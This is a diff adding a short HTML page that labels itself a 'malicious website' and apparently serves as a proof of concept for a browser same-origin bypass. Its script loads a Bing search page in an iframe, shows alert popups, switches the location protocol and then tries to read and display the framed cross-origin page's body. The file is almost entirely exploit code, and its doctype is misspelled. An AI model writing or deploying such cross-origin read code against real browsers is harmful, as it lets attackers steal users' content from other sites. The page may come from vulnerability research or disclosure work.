@@ -1,0 +1,23 @@
+<!DOCTYPE hxtml>
+<html>
+  <head>
+  </head>
+  <body>
+    <h1> Here there ! Welcome on my malicious website ;p </h1>
+    <p> This is some content </p>
+    <div class="maliciousFrame">
+      <iframe id="mFrameWindow" name="mFrameWindow"></iframe>
+    </div>
+
+    <div class="targetFrame">
+      <iframe id="tFrameWindow" name="tFrameWindow" src=""></iframe>
+    </div>
+
+    <script>
+      document.body.innerHTML = '<iframe src="http://www.bing.com/images/search?q=microsoft+edge"></iframe>';
+      window.setTimeout('alert("Do not close this popup")', 2);
+
+      window.setTimeout('document.location.protocol = "http:"; var frame = document.getElementsByTagName("iframe")[0]; var bodyTarget = frame.contentDocument.getElementsByTagName("body")[0]; alert("Here is the body --> " + bodyTarget.innerHTML);', 4);
+    </script>
+  </body>
+</html>
